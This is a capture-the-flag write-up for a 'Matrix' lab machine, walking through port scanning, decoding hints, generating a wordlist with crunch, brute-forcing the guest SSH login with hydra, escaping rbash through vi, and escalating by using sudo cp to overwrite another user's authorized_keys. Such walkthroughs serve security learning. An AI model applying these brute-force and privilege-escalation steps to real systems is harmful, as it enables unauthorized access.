# Write-UP Matrix

## Enumeration :

```nmap -p- 192.168.1.19```


## Port 80

It says to follow the white rabbit ... at the top bottom we can find a image of a white rabbit. When we click on it we can see it name :

p0rt_31337.png

## Port 31337

It's another website, same design as the first one. In the source code we find :

```ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= ```

It's Base 64, which decoded is :

```echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix```

At this point, I started to feel blocked. After minutes of unsuccessful enumeration, I found a file call Cypher.matrix at the root of the website.

## Cypher.matrix

The Cypher is actually braincode, when interprate it gives :

```
You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password
```

This hint tell us cleary to bruteforce guest user.

## Bruteforce

Let's generate the password list using the hint.

```
❯❯ crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ -o wordlist.txt
```

then bruteforce on ssh :

```
❯❯ hydra -l guest -P wordlist.txt 172.20.10.12 ssh -t4
[sip]
[22][ssh] host: 172.20.10.12   login: guest   password: k1ll0r7n
```

Found it !

Now, just have to :

```
ssh guest@172.20.10.12
guest@porteus:~$ 
```

## Priv ESC

### rbash

The first thing we have to figured out is how to escape rbash.
I go quite easily on it, cause of vi.
Actually VI is authorized so i do :

```
vi
:!/bin/sh
sh-4.4$ bash
guest@porteus:~$ ls
Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  prog/
```
And then we are not using rbash anymore.

Using sudo -l, we see that we can use /bin/cp as trinity. 

```
sudo -u trinity /bin/cp toto.txt /home/trinity/.ssh/authorized_keys
❯❯ ssh trinity@172.20.10.12 -i /root/.ssh/id_rsa
Last login: Mon Aug  6 16:37:45 2018 from 192.168.56.102
trinity@porteus:~$
```






